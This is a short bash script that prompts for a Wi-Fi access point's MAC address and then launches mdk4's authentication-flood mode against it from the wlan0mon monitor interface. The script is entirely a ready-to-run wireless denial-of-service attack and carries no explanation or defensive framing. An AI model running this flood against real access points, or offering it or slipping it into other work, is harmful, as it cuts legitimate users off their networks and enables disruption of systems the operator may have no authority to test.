#!/bin/bash
bssid=$(zenity --entry --text="ap mac address?")
xterm -hold -e "mdk4 wlan0mon a -a $bssid"
